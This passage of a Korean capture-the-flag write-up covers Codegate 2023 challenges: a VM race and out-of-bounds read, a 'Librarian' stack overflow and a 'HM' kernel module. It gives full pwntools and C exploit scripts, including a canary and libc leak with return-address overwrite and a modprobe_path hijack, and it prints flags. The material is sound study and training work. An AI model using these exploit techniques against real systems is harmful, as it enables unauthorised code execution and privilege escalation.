REG-\u0026gt;X2; sleep(1u); v18-\u0026gt;RES = *(v3 + REG-\u0026gt;X0 + 8); break; case 3: v2 = REG-\u0026gt;X3; sleep(1u); v18-\u0026gt;RES = *(v2 + REG-\u0026gt;X0 + 8); break; } } else { v5 = REG-\u0026gt;X0; sleep(1u); v18-\u0026gt;RES = *(v5 + REG-\u0026gt;X0 + 8); } break; case 7: DUMP_REGS(); // v18 -\u0026gt; RES and v18 -\u0026gt; INDEX == 0 // stack race, X0 register Reset SEGV break; default: break; } pthread_mutex_lock(\u0026amp;mutex_4); reg_node(EX_NODE, v18); // Vuln EX \u0026lt;-\u0026gt; WB race pthread_mutex_unlock(\u0026amp;mutex_4); free(R_NODE); } return 0LL; } 실질적으로 처리가 되는 부분이다.\nMOV DREG, IMM16 MOV DREG, SREG GET_RSTR() MOV X0[IDX8+8], IMM8 MOV DREG, SREG[IDX8+8] MOV DREG[X0+8], IMM8 MOV DREG, SREG[X0+8] DUMP_REGS() 위 명령들이 구현되어있다. branch나 레지스터에 대한 연산은 지원되지 않는다.\nint __fastcall DUMP_REGS() { printf(\u0026#34;================== [REGS] ==================\\n\u0026#34;); printf(\u0026#34;X0 : 0x%lx\\n\u0026#34;, REG-\u0026gt;X0); printf(\u0026#34;X1 : 0x%lx\\n\u0026#34;, REG-\u0026gt;X1); printf(\u0026#34;X2 : 0x%lx\\n\u0026#34;, REG-\u0026gt;X2); printf(\u0026#34;X3 : 0x%lx\\n\u0026#34;, REG-\u0026gt;X3); return printf(\u0026#34;============================================\\n\u0026#34;); } char *__fastcall GET_STR() { int i; // [rsp+14h] [rbp-Ch] for ( i = 0; i \u0026lt; 4; ++i ) // 0x10008/8 = 0x2001 { if ( ANON[i].is_active == 1 ) { strcpy(ANON[i].payload, (\u0026amp;str_list)[*ANON[i].payload]); ANON[i].is_active = 0LL; return \u0026amp;ANON[i]; // sz 0x10008 } } // 4 chances return STR return 0LL; } .data:0000000000006100 str_list dq offset aLoremIpsumDolo .data:0000000000006100 ; DATA XREF: GET_STR+72↑o .data:0000000000006100 ; \u0026#34;Lorem ipsum dolor sit amet, consectetur\u0026#34;... .data:0000000000006108 dq offset aInViverraEnimE ; \u0026#34;In viverra enim eu mollis consequat. Nu\u0026#34;... .data:0000000000006110 dq offset aVestibulumVelL ; \u0026#34;Vestibulum vel laoreet magna. Curabitur\u0026#34;... .data:0000000000006118 dq offset aIntegerFringil ; \u0026#34;Integer fringilla urna risus, vel gravi\u0026#34;... .data:0000000000006120 dq offset aNullaSemperDig ; \u0026#34;Nulla semper dignissim lectus et rhoncu\u0026#34;... .data:0000000000006128 dq offset aPhasellusNecSa ; \u0026#34;Phasellus nec sagittis diam. Aliquam co\u0026#34;... .data:0000000000006130 dq offset aDonecTincidunt ; \u0026#34;Donec tincidunt posuere augue, sed port\u0026#34;... .data:0000000000006138 dq offset aSuspendisseSod ; \u0026#34;Suspendisse sodales erat sit amet commo\u0026#34;... .data:0000000000006140 dq offset aDonecPortaAugu ; \u0026#34;Donec porta augue sed congue cursus. Vi\u0026#34;... .data:0000000000006148 dq offset aAliquamConsect ; \u0026#34;Aliquam consectetur accumsan molestie. \u0026#34;... .data:0000000000006150 dq offset FLAG ; \u0026#34;codegate2023{aaaaaaaaaaaaaaaaaaaaaaaaaa\u0026#34;... .data:0000000000006150 _data ends .data:0000000000006150 기본적으로 rand()%10으로 메모리 영역이 초기화되어있어서 정상적으로 FLAG는 접근할 수 없다.\nvoid *__fastcall WB_(void *a1) { struct EX_STR *R_NODE; // [rsp+0h] [rbp-10h] R_NODE = RET_R_NODE(EX_NODE); if ( R_NODE ) { if ( R_NODE-\u0026gt;INDEX ) { switch ( R_NODE-\u0026gt;INDEX ) { case 1: if ( REG-\u0026gt;X1 \u0026gt;= 0x10000uLL ) reset(REG-\u0026gt;X1); REG-\u0026gt;X1 = R_NODE-\u0026gt;RES; break; case 2: if ( REG-\u0026gt;X2 \u0026gt;= 0x10000uLL ) reset(REG-\u0026gt;X2); REG-\u0026gt;X2 = R_NODE-\u0026gt;RES; break; case 3: if ( REG-\u0026gt;X3 \u0026gt;= 0x10000uLL ) reset(REG-\u0026gt;X3); REG-\u0026gt;X3 = R_NODE-\u0026gt;RES; break; } } else { if ( REG-\u0026gt;X0 \u0026gt;= 0x10000uLL ) reset(REG-\u0026gt;X0); REG-\u0026gt;X0 = R_NODE-\u0026gt;RES; } free(R_NODE); } return 0LL; } WriteBack으로 결과에 대한 레지스터 쓰기 작업을 수행한다.\nnode *__fastcall sub_2360(node *a1) { node *result; // rax a1-\u0026gt;B = rand() % 10; result = a1; a1-\u0026gt;A = 1LL; return result; } 특정 메모리 영역을 GET_STR로 다시 리턴받을 수 있도록 초기화해주는 함수다.\n__int64 sub_27E0() { sub_2A30(IF_NODE); sub_2A30(ID_NODE); sub_2A30(ID2_NODE); sub_2A30(EX_NODE); free(instr); printf(\u0026#34;Total Cycle: %lu\\n\u0026#34;, cycle); return DUMP_REGS(); } 나중에 모두 처리가 완료되면 레지스터 상태랑 사이클을 출력하고 종료한다.\nExploitation .text:0000000000001A7F mov edi, 1 ; seconds .text:0000000000001A84 call _sleep .text:0000000000001A89 mov rax, [rbp+var_48] .text:0000000000001A8D mov rcx, [rbp+R_NODE] .text:0000000000001A91 movzx ecx, byte ptr [rcx+0Dh] .text:0000000000001A95 movsx rcx, byte ptr [rax+rcx+8] .text:0000000000001A9B mov rax, [rbp+var_18] MOV DREG, SREG[IDX8+8] MOV DREG, SREG[X0+8] 위 명령어들은 로드 과정에서 sign bit를 붙여서 확장을 진행해서 OOB가 발생한다.\n데이터 의존성에 대한 처리가 미흡해서 race condition이 발생할 수 있다.\nIF ID IF ID2 ID IF EX ID2 ID IF WB EX ID2 ID IF IF WB EX ID2 ID IF ID IF WB EX ID2 ID IF 위와 형태로 실행된다. 이때 EX는 명령에 따라 처리되는 속도가 가장 크게 달라진다. EX뿐만 아니라 다른 부분에서도 잠재적인 race condition이 발생할 수 있다.\nMOV DREG, SREG[IDX8+8] DUMP_REGS() 위 두 명령을 반복적으로 사용해서 플래그를 릭하는데, 여기서 문제가 발생한다.\nMOV DREG, IMM16 MOV DREG, SREG GET_RSTR() DUMP_REGS() 위 네가지 명령들을 제외하고는 EX가 처리시간이 가장 늦으니 파이프라이닝시 처리 순서는 웬만하면 WB, ID2, ID, IF, EX 순서이다. 레지스터가 Fetch 되는 시점을 기준으로 파이프라이닝시 순서는 웬만하면 WB, EX, ID2, ID, IF 순서이다.\n첫 번째 cycle에서 처리해야할 명령은 MOV DREG, SREG[IDX8+8]이고 SREG가 X0이라고 가정하고 생각해보면, EX에서 X0 Fetch가 일어난다.\n두 번째 cycle에서 처리해야할 명령이 DUMP_REGS()라고 가정하고 X0이 Fetch되는 시점을 기준으로 생각해보면, 선행 명령의 결과가 WB에서 X0에 저장되고 그다음으로 EX에서 후행 명령 DUMP_REGS()를 처리하면서 X0 Fetch가 되며 정상적으로 1바이트를 릭할 수 있다.\n세 번째 cycle에서 처리해야할 명령이 MOV DREG, SREG[IDX8+8]이고 SREG가 X0이라고 가정하고 X0이 Fetch되는 시점을 기준으로 생각해보면, 선행 명령 DUMP_REGS()의 WB에서 X0에 write가 일어나며 이때 업데이트된 v18-\u0026gt;INDEX와 v18-\u0026gt;RES는 0이다. 이후 후행 명령 MOV DREG, SREG[IDX8+8]이 처리되면서 EX에서 X0이 Fetch되는데, 이때 같은 사이클내에서 WB과 EX 사이의 race가 발생한다. 명령에 따라서 혹은 환경에 따라서 X0이 Fetch 되는 시점이 일정하다는것을 보장할 수 없기에 레지스터의 값은 0이 될 수 있고 유효하지 않은 주소가 참조되며 Segmentation fault가 발생한다.\n사실 굳이 안따지고 안터지길 기도하면서 그냥 익스해도 된다 ㅋㅋㅋ.\nExploit script from pwn import * DEBUG = False off = [0x0025DD,0x001E11] script = \u0026#39;\u0026#39; for i in off: script += f\u0026#39;brva {hex(i)}\\n\u0026#39; script += \u0026#39;c\\njump * $rip+0xee\u0026#39; context.terminal = [\u0026#39;tmux\u0026#39;,\u0026#39;splitw\u0026#39;,\u0026#39;-h\u0026#39;] context.binary = e = ELF(\u0026#39;./app\u0026#39;) if DEBUG: p = gdb.debug(e.path, gdbscript = script) else: p = process(e.path) # opcode | ... operands ... | class VM(): REG_SET = { \u0026#34;X0\u0026#34; : 0, \u0026#34;X1\u0026#34; : 1, \u0026#34;X2\u0026#34; : 2, \u0026#34;X3\u0026#34; : 3, } OPCODE = { \u0026#34;MOV DREG, IMM16\u0026#34; : 0, \u0026#34;MOV DREG, SREG\u0026#34; : 1, \u0026#34;GET_RSTR()\u0026#34; : 2, \u0026#34;MOV X0[IDX8+8], IMM8\u0026#34; : 3, \u0026#34;MOV DREG, SREG[IDX8+8]\u0026#34; : 4, \u0026#34;MOV DREG[X0+8], IMM8\u0026#34; : 5, \u0026#34;MOV DREG, SREG[X0+8]\u0026#34; : 6, \u0026#34;DUMP_REGS()\u0026#34; : 7, } def __init__(self): self.instructions = [] def ERR(self,msg): print(msg) exit(-1) def gen(self,opcode,RES_REG=None,operand1=None,operand2=None): if opcode in VM.OPCODE.keys(): op = VM.OPCODE[opcode] if op == 0: if RES_REG == None or RES_REG not in VM.REG_SET.keys(): self.ERR(\u0026#34;Unknown RES_REG\u0026#34;) if operand1 == None: self.ERR(\u0026#34;Unknown OPERAND1\u0026#34;) instr = op | ((VM.REG_SET[RES_REG])\u0026lt;\u0026lt;8) | (operand1\u0026amp;0xffff) \u0026lt;\u0026lt; (8*2) elif op == 1: instr = 0 if RES_REG == None or RES_REG not in VM.REG_SET.keys(): self.ERR(\u0026#34;Unknown RES_REG\u0026#34;) if operand2 == None or operand2 not in VM.REG_SET.keys(): self.ERR(\u0026#34;Unknown OPERAND2\u0026#34;) if operand1 != None or operand1 in VM.REG_SET.keys(): instr |= VM.REG_SET[operand1] \u0026lt;\u0026lt; (8*2) # not really used instr = op | ((VM.REG_SET[RES_REG])\u0026lt;\u0026lt;8) | (VM.REG_SET[operand2]) \u0026lt;\u0026lt; (8*3) elif op == 2: if RES_REG == None or RES_REG not in VM.REG_SET.keys(): self.ERR(\u0026#34;Unknown RES_REG\u0026#34;) instr = 0 instr |= op | VM.REG_SET[RES_REG] \u0026lt;\u0026lt; 8 | 0xffff \u0026lt;\u0026lt; 8*2 # 0xffff not used / only to bypass precheck.py assertions elif op == 3: if operand1 == None: self.ERR(\u0026#34;Unknown OPERAND1\u0026#34;) if operand2 == None: self.ERR(\u0026#34;Unknown OPERAND2\u0026#34;) instr = 0 instr |= (op | operand1 \u0026lt;\u0026lt; (8*2) | operand2 \u0026lt;\u0026lt; (8*3)) elif op == 4: if RES_REG == None or RES_REG not in VM.REG_SET.keys(): self.ERR(\u0026#34;Unknown RES_REG\u0026#34;) if operand1 == None or operand1 not in VM.REG_SET.keys(): self.ERR(\u0026#34;Unknown OPERAND1\u0026#34;) if operand2 == None: self.ERR(\u0026#34;Unknown OPERAND2\u0026#34;) instr = 0 instr |= (op | ((VM.REG_SET[RES_REG])\u0026lt;\u0026lt;8) |VM.REG_SET[operand1] \u0026lt;\u0026lt; (8*2) | operand2 \u0026lt;\u0026lt; (8*3)) elif op == 5: if RES_REG == None or RES_REG not in VM.REG_SET.keys(): self.ERR(\u0026#34;Unknown RES_REG\u0026#34;) if operand2 == None: self.ERR(\u0026#34;Unknown OPERAND2\u0026#34;) instr = 0 instr |= (op | VM.REG_SET[RES_REG] \u0026lt;\u0026lt; 8 | operand2 \u0026lt;\u0026lt; (8*3)) elif op == 6: if RES_REG == None or RES_REG not in VM.REG_SET.keys(): self.ERR(\u0026#34;Unknown RES_REG\u0026#34;) if operand2 == None or operand2 not in VM.REG_SET.keys(): self.ERR(\u0026#34;Unknown OPERAND2\u0026#34;) instr = 0 instr |= (op | VM.REG_SET[RES_REG] \u0026lt;\u0026lt; 8 | VM.REG_SET[operand2] \u0026lt;\u0026lt; (8*3)) elif op == 7: instr = 0 instr |= op self.instructions.append(instr) else: self.ERR(\u0026#34;Unknown OPCODE\u0026#34;) def out(self): return self.instructions if __name__ == \u0026#34;__main__\u0026#34;: s = VM() s.gen(\u0026#34;GET_RSTR()\u0026#34;,\u0026#34;X1\u0026#34;) s.gen(\u0026#34;MOV DREG, IMM16\u0026#34;,\u0026#34;X0\u0026#34;,0x10) s.gen(\u0026#34;MOV DREG[X0+8], IMM8\u0026#34;,\u0026#34;X1\u0026#34;,None,(-8)\u0026amp;0xff) s.gen(\u0026#34;MOV DREG, IMM16\u0026#34;,\u0026#34;X0\u0026#34;,0x0) s.gen(\u0026#34;MOV DREG[X0+8], IMM8\u0026#34;,\u0026#34;X1\u0026#34;,None,0xa) for i in range(7): s.gen(\u0026#34;MOV DREG, IMM16\u0026#34;,\u0026#34;X0\u0026#34;,i+1) s.gen(\u0026#34;MOV DREG[X0+8], IMM8\u0026#34;,\u0026#34;X1\u0026#34;,None,0x0) s.gen(\u0026#34;MOV DREG, IMM16\u0026#34;,\u0026#34;X0\u0026#34;,0x10) s.gen(\u0026#34;MOV DREG, SREG[X0+8]\u0026#34;,\u0026#34;X2\u0026#34;,None,\u0026#34;X1\u0026#34;) s.gen(\u0026#34;MOV DREG, SREG\u0026#34;,\u0026#34;X0\u0026#34;,None,\u0026#34;X2\u0026#34;) s.gen(\u0026#34;MOV DREG[X0+8], IMM8\u0026#34;,\u0026#34;X1\u0026#34;,None,0x01) s.gen(\u0026#34;MOV DREG, SREG\u0026#34;,\u0026#34;X2\u0026#34;,None,\u0026#34;X0\u0026#34;) # TRANSFER SREG = 0 s.gen(\u0026#34;GET_RSTR()\u0026#34;,\u0026#34;X0\u0026#34;) for i in range(100): # s.gen(\u0026#34;MOV DREG, SREG[IDX8+8]\u0026#34;,\u0026#34;X3\u0026#34;,\u0026#34;X0\u0026#34;,i) s.gen(\u0026#34;MOV DREG, SREG[IDX8+8]\u0026#34;,\u0026#34;X3\u0026#34;,\u0026#34;X1\u0026#34;,i) \u0026#39;\u0026#39;\u0026#39; case 4: v3-\u0026gt;flag = 0; v3-\u0026gt;operand1 = n-\u0026gt;operand1; v3-\u0026gt;operand2 = n-\u0026gt;operand2; v3-\u0026gt;operand3 = n-\u0026gt;operand3; // R_NODE-\u0026gt;operand3 case 1: v3-\u0026gt;flag = 0; v3-\u0026gt;operand1 = n-\u0026gt;operand1; v3-\u0026gt;operand2 = n-\u0026gt;operand2; v3-\u0026gt;operand3 = n-\u0026gt;operand3; \u0026#39;\u0026#39;\u0026#39; s.gen(\u0026#34;DUMP_REGS()\u0026#34;) # WB \u0026lt;-\u0026gt; EX // racecondition REGS, NODE # CYCLE1 : WB -\u0026gt; ID2 -\u0026gt; ID -\u0026gt; IF -\u0026gt; EX (FETCH X0, sleep 1, DUMP REGS, v18-\u0026gt; RES and v18 -\u0026gt; INDEX == 0) nodeupdate -\u0026gt; RACE # CYCLE2 : WB (EX_NODE race, X0 reset) -\u0026gt; EX(FETCH X0 sleep 1, SEGV) # use X1 instead \u0026#39;\u0026#39;\u0026#39; [ 290.815519] app[3419]: segfault at 48 ip 0000563249c0fa49 sp 00007f927a3a4e30 error 4 in app[563249c0f000+2000] [ 290.819216] Code: 00 00 00 48 8d 05 27 48 04 00 48 8b 00 48 8b 00 48 89 45 c0 bf 01 00 00 00 e8 43 f7 ff ff 48 8b 45 c0 48 8b 4d f0 0f b6 49 0d \u0026lt;48\u0026gt; 0f be 4c 08 08 48 8b 45 e8 48 89 48 10 e9 ee 00 00 00 48 8b 45 [ 290.824907] potentially unexpected fatal signal 11. [ 290.826388] CPU: 0 PID: 3419 Comm: app Not tainted 5.10.16.3-microsoft-standard-WSL2 #1 [ 290.828778] RIP: 0033:0x563249c0fa49 [ 290.830098] Code: 00 00 00 48 8d 05 27 48 04 00 48 8b 00 48 8b 00 48 89 45 c0 bf 01 00 00 00 e8 43 f7 ff ff 48 8b 45 c0 48 8b 4d f0 0f b6 49 0d \u0026lt;48\u0026gt; 0f be 4c 08 08 48 8b 45 e8 48 89 48 10 e9 ee 00 00 00 48 8b 45 [ 290.835299] RSP: 002b:00007f927a3a4e30 EFLAGS: 00010206 [ 290.836795] RAX: 0000000000000000 RBX: 00007f927a3a56c0 RCX: 0000000000000040 [ 290.839103] RDX: 0000000000000000 RSI: 0000000000000000 RDI: 00007f927a3a59c8 [ 290.841486] RBP: 00007f927a3a4ed0 R08: 0000000000000000 R09: 00000007f9270002 [ 290.843830] R10: 00007f927a3a4df0 R11: 0000000000000293 R12: ffffffffffffff80 [ 290.846245] R13: 0000000000000000 R14: 00007fff94052020 R15: 00007f9279ba5000 [ 290.848460] FS: 00007f927a3a56c0 GS: 0000000000000000 563249C11000 563249c0fa49 .text:0000000000001A3D mov rax, [rbp+var_40] .text:0000000000001A41 mov rcx, [rbp+R_NODE] .text:0000000000001A45 movzx ecx, byte ptr [rcx+0Dh] .text:0000000000001A49 movsx rcx, byte ptr [rax+rcx+8] .text:0000000000001A4F mov rax, [rbp+var_18] .text:0000000000001A53 mov [rax+10h], rcx \u0026#39;\u0026#39;\u0026#39; instructions = s.out() p.sendlineafter(b\u0026#39;Inst Size \u0026gt;\u0026#39;,str(len(instructions))) for i in instructions: p.sendline(str(i)) rvu = lambda x : p.recvuntil(x) FLAG = \u0026#39;\u0026#39; for i in range(100): rvu(\u0026#34;X3 : \u0026#34;) FLAG += (chr(int(rvu(\u0026#39;\\x0a\u0026#39;)[:-1],16))) print(FLAG) p.interactive() # IF # ID IF # ID2 ID IF # EX ID2 ID IF # WB EX ID2 ID IF # IF WB EX ID2 ID IF # ID IF WB EX ID2 ID IF Librarian Analysis sub_184C(); v3 = time(0LL); srand(v3); memset(s, 0, 0x780uLL); while ( (unsigned int)cnt \u0026lt;= 9 ) { v6 = rand() % 30; strcpy(\u0026amp;s[0x80 * (unsigned __int64)(unsigned int)cnt], \u0026amp;aTheCatcherInTh[0x40 * (__int64)v6]); ++cnt; } do { print_menu(); __isoc99_scanf(\u0026#34;%d\u0026#34;, \u0026amp;v5); switch ( v5 ) { case 1: display((__int64)s); break; case 2: if ( (unsigned int)cnt \u0026gt; 14 ) { puts(\u0026#34;The book list is full.\u0026#34;); } else { add((__int64)s); sort((__int64)s); } break; case 3: sub_172A((__int64)s); break; case 4: sub_180F(s); break; case 5: puts(\u0026#34;Exiting...\u0026#34;); break; default: puts(\u0026#34;Invalid choice. Please try again.\u0026#34;); break; } } while ( v5 != 5 ); return 0LL; } 랜덤한 이름으로 초기화된다.\nunsigned __int64 __fastcall sub_172A(__int64 a1) { unsigned int v2; // [rsp+18h] [rbp-58h] int v3; // [rsp+1Ch] [rbp-54h] char buf[72]; // [rsp+20h] [rbp-50h] BYREF unsigned __int64 v5; // [rsp+68h] [rbp-8h] v5 = __readfsqword(0x28u); printf(\u0026#34;Index: \u0026#34;); __isoc99_scanf(\u0026#34;%d\u0026#34;, v2); if ( v2 \u0026gt;= cnt ) { puts(\u0026#34;Index must be less than the number of books.\u0026#34;); } else { v3 = read(0, buf, 0x3FuLL); if ( buf[v3 - 1] == \u0026#39;\\n\u0026#39; ) buf[v3 - 1] = 0; memcpy((void *)(((unsigned __int64)v2 \u0026lt;\u0026lt; 7) + a1 + 0x40), buf, v3); } return v5 - __readfsqword(0x28u); } case3에서 scanf %d, v2로 받는데, v2가 unsigned int이고 포인터가 아니라 무조건 터진다. 사실상 없는 기능이다.\nunsigned __int64 __fastcall add(__int64 a1) { int v2; // [rsp+1Ch] [rbp-54h] char buf[72]; // [rsp+20h] [rbp-50h] BYREF unsigned __int64 v4; // [rsp+68h] [rbp-8h] v4 = __readfsqword(0x28u); printf(\u0026#34;Book title: \u0026#34;); v2 = read(0, buf, 0x3FuLL); if ( buf[v2 - 1] == 10 ) buf[v2 - 1] = 0; memcpy((void *)(((unsigned __int64)(unsigned int)cnt \u0026lt;\u0026lt; 7) + a1), buf, v2); ++cnt; return v4 - __readfsqword(0x28u); } 여기서 case2에서 입력받고, 추가한다. 그리고 sort 함수를 호출한다.\nv4 = cnt - 2; while ( v4 \u0026gt;= 0 ) { if ( strcmp((const char *)(((v4 + 1LL) \u0026lt;\u0026lt; 7) + a1), (const char *)(((__int64)v4 \u0026lt;\u0026lt; 7) + a1)) \u0026gt;= 0 || v4 == cnt ) { --v4; } else // swap { v1 = (__int64 *)(((__int64)v4 \u0026lt;\u0026lt; 7) + a1); v5 = *v1; v6 = v1[1]; v7 = v1[2]; v8 = v1[3]; v9 = v1[4]; v10 = v1[5]; v11 = v1[6]; v12 = v1[7]; v13 = v1[8]; v14 = v1[9]; v15 = v1[10]; v16 = v1[11]; v17 = v1[12]; v18 = v1[13]; v19 = v1[14]; v20 = v1[15]; memcpy(v1, (const void *)(((v4 + 1LL) \u0026lt;\u0026lt; 7) + a1), 0x40uLL);// if s[0] \u0026lt; s[1] -\u0026gt; s[0] = s[1] memcpy((void *)(((__int64)v4 \u0026lt;\u0026lt; 7) + a1 + 0x40), (const void *)(((v4 + 1LL) \u0026lt;\u0026lt; 7) + a1 + 64), 0x40uLL); v2 = (_QWORD *)(((v4 + 1LL) \u0026lt;\u0026lt; 7) + a1); *v2 = v5; // s[1] = s[0] v2[1] = v6; v2[2] = v7; v2[3] = v8; v2[4] = v9; v2[5] = v10; v2[6] = v11; v2[7] = v12; v2 += 8; *v2 = v13; v2[1] = v14; v2[2] = v15; v2[3] = v16; v2[4] = v17; v2[5] = v18; v2[6] = v19; v2[7] = v20; ++v4; } } return v21 - __readfsqword(0x28u); } 버블 소트 비스무리하게 생겼다. 문자열 크기가 큰 순서대로 뒤로간다.\nExploitation strcmp((const char *)(((v4 + 1LL) \u0026lt;\u0026lt; 7) + a1), (const char *)(((__int64)v4 \u0026lt;\u0026lt; 7) + a1)) \u0026gt;= 0 || v4 == cnt 조건을 만족하지 않으면 swap하고 v4++가 된다. v4 == cnt-1로 수정되어야한다. v4에 대한 경계 체크가 미흡해서 sfp, ret, canary 릭이 가능하고, 크기를 잘 맞추면 덮는 것도 가능하다.\nExploit script from pwn import * DEBUG = False context.terminal=[\u0026#39;tmux\u0026#39;, \u0026#39;splitw\u0026#39;, \u0026#39;-h\u0026#39;] context.binary = e = ELF(\u0026#39;./librarian\u0026#39;) libc = ELF(\u0026#39;/usr/lib/x86_64-linux-gnu/libc.so.6\u0026#39;) off = [0x0175D,] # 0x13F4,0x0151D,0x0156B script = \u0026#39;\u0026#39; for i in off: script += f\u0026#39;brva {hex(i)}\\n\u0026#39; if DEBUG: p = gdb.debug(e.path,env={\u0026#34;LD_PRELOAD\u0026#34;:\u0026#34;./libc.so.6\u0026#34;}, gdbscript=script) else : #p = process(e.path,env={\u0026#34;LD_PRELOAD\u0026#34;:\u0026#34;./libc.so.6\u0026#34;}) p = remote(\u0026#39;43.201.16.196\u0026#39;,8888) sla = lambda x,y : p.sendlineafter(x,y) sa = lambda x,y : p.sendafter(x,y) def add_book(x): sla(b\u0026#39;choice: \u0026#39;,b\u0026#39;2\u0026#39;) sa(b\u0026#39;Book title: \u0026#39;,x) sla(b\u0026#39;choice: \u0026#39;,b\u0026#39;4\u0026#39;) for i in range(14): add_book(b\u0026#39;A\u0026#39;*(0x30+i+1)) add_book(b\u0026#39;A\u0026#39;*(0x1)) sla(b\u0026#39;choice: \u0026#39;,b\u0026#39;1\u0026#39;) p.recvuntil(b\u0026#39;1. \u0026#39;) p.recv(8) canary = u64(p.recv(8)) p.recv(8) libc_base = u64(p.recv(8)) - 0x23510 success(\u0026#34;libc_base : \u0026#34; + hex(libc_base)) stack = u64(p.recv(8)) success(\u0026#34;stack : \u0026#34; + hex(stack)) success(\u0026#34;canary : \u0026#34; + hex(canary)) sla(b\u0026#39;choice: \u0026#39;,b\u0026#39;4\u0026#39;) for i in range(13): add_book(b\u0026#39;B\u0026#39;*(0x30+i+1)) pay = b\u0026#39;\\xff\u0026#39;*0x8 + p64(canary) pay += p64(0) pay += p64(libc_base + 0x4e1d0) pay += b\u0026#39;\\xff\u0026#39;*(0x30+14- len(pay)) add_book(pay) add_book(b\u0026#39;B\u0026#39;*(0x1)) sla(\u0026#39;choice:\u0026#39;,b\u0026#39;5\u0026#39;) p.interactive() codegate2023{dceb0dcf4aed699a87d1f831f5ff5d5402135fcd211f4bbffab699915b9c78a0de98b6d5b53aaf3c19b8673805de1c8b0325c4c4cd18bc72fe73610f}\nHM Analysis __int64 __fastcall m_ioctl(__int64 a1, __int64 a2) { __int64 args; // rdx __int64 result; // rax _fentry__(a1, a2); copy_from_user(\u0026amp;user_input, args, 0x10LL); result = 0LL; if ( (_DWORD)a2 == 0x1337 ) // 0x1337 { copy_from_user(user_input, *(\u0026amp;user_input + 1), 0xCLL); return 1LL; } return result; } AAW를 준다.\n#!/bin/sh /bin/busybox --install -s stty raw -echo chown -R 0:0 / mkdir -p /proc \u0026amp;\u0026amp; mount -t proc none /proc mkdir -p /dev \u0026amp;\u0026amp; mount -t devtmpfs devtmpfs /dev mkdir -p /tmp \u0026amp;\u0026amp; mount -t tmpfs tmpfs /tmp echo 0 \u0026gt; /proc/sys/kernel/kptr_restrict echo 0 \u0026gt; /proc/sys/kernel/perf_event_paranoid echo 1 \u0026gt; d chmod 444 /proc/kallsyms chmod 400 /flag insmod /hm.ko chmod 666 /dev/hm mv /exploit /tmp/exploit chown -R 1000:1000 /tmp setsid /bin/cttyhack setuidgid 1000 /bin/sh umount /proc poweroff -d 1 -n -f rootfs/etc/init.d/rcS를 보면 위와 같다. kadr이 비활성화되어있다.\nExploitation KADR 안걸려있으니 릭하고 modprobe_path 덮었다.\nExploit script #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;sys/ioctl.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;sys/wait.h\u0026gt; struct info { uint64_t dst; // must be kernel space uint8_t * src; }; void shell(void){ system(\u0026#34;echo \u0026#39;#!/bin/sh\\nchmod 777 /flag\u0026#39; \u0026gt; /tmp/x\u0026#34;); system(\u0026#34;chmod +x /tmp/x\u0026#34;); system(\u0026#34;echo -ne \u0026#39;\\\\xff\\\\xff\\\\xff\\\\xff\u0026#39; \u0026gt; /tmp/v\u0026#34;); system(\u0026#34;chmod +x /tmp/v\u0026#34;); system(\u0026#34;/tmp/v\u0026#34;); system(\u0026#34;cat /flag\u0026#34;); exit(0); } int main(){ int fd = open(\u0026#34;/dev/hm\u0026#34;,O_RDONLY); if (fd == -1) exit(-1); struct info io; system(\u0026#34;cat /proc/kallsyms | grep modprobe_path\u0026#34;); uint64_t modprobe_path; puts(\u0026#34;\u0026gt; \u0026#34;); scanf(\u0026#34;%lx\u0026#34;,\u0026amp;modprobe_path); printf(\u0026#34;modprobe_path : %lx\u0026#34;,modprobe_path); io.dst = modprobe_path; io.src = malloc(0x20); strcpy(io.src,\u0026#34;/tmp/x\\x00\u0026#34;); ioctl(fd, 0x1337, \u0026amp;io); shell(); close(fd); return 0; } codegate2023{cOnGrAtUlAtIoNs_!_HoPe_1t_wAs_a_FuN_cHaLl}\nEasyReversing Analysis void __noreturn sub_7FF7E1AA2030() { char *v0; // rdi __int64 i; // rcx char v2[280]; // [rsp+20h] [rbp+0h] BYREF v0 = v2; for ( i = 26i64; i; --i ) { *(_DWORD *)v0 = -858993460; v0 += 4; } sub_7FF7E1AA13A2(byte_7FF7E1AB20A3); memset(\u0026amp;v2[16], 0, 0x40ui64); SetUnhandledExceptionFilter(TopLevelExceptionFilter); __debugbreak(); } 메인 로직 잘 찾아서 확인했더니 슈도코드가 짤려있다.\n.text:00007FF7E1AA2030 ; __unwind { // j___GSHandlerCheck .text:00007FF7E1AA2030 push rbp .text:00007FF7E1AA2032 push rdi .text:00007FF7E1AA2033 sub rsp, 148h .text:00007FF7E1AA203A lea rbp, [rsp+20h] .text:00007FF7E1AA203F lea rdi, [rsp+150h+var_130] .text:00007FF7E1AA2044 mov ecx, 1Ah .text:00007FF7E1AA2049 mov eax, 0CCCCCCCCh .text:00007FF7E1AA204E rep stosd .text:00007FF7E1AA2050 mov rax, cs:__security_cookie .text:00007FF7E1AA2057 xor rax, rbp .text:00007FF7E1AA205A mov [rbp+130h+var_18], rax .text:00007FF7E1AA2061 lea rcx, byte_7FF7E1AB20A3 .text:00007FF7E1AA2068 call sub_7FF7E1AA13A2 .text:00007FF7E1AA206D lea rax, [rbp+130h+Buf1] .text:00007FF7E1AA2071 mov rdi, rax .text:00007FF7E1AA2074 xor eax, eax .text:00007FF7E1AA2076 mov ecx, 40h ; \u0026#39;@\u0026#39; .text:00007FF7E1AA207B rep stosb .text:00007FF7E1AA207D lea rcx, TopLevelExceptionFilter ; lpTopLevelExceptionFilter .text:00007FF7E1AA2084 call cs:SetUnhandledExceptionFilter .text:00007FF7E1AA208A int 3 ; Trap to Debugger .text:00007FF7E1AA208B ; --------------------------------------------------------------------------- .text:00007FF7E1AA208B lea rcx, aInput ; \u0026#34;INPUT: \u0026#34; .text:00007FF7E1AA2092 call sub_7FF7E1AA11A9 .text:00007FF7E1AA2097 mov r8d, 40h ; \u0026#39;@\u0026#39; .text:00007FF7E1AA209D lea rdx, [rbp+130h+Buf1] .text:00007FF7E1AA20A1 lea rcx, Format ; \u0026#34;%s\u0026#34; .text:00007FF7E1AA20A8 call scanf .text:00007FF7E1AA20AD lea rcx, [rbp+130h+Buf1] .text:00007FF7E1AA20B1 call stage_1 .text:00007FF7E1AA20B6 lea rcx, [rbp+130h+Buf1] .text:00007FF7E1AA20BA call stage_2 .text:00007FF7E1AA20BF lea rcx, [rbp+130h+Buf1] .text:00007FF7E1AA20C3 call stage_3 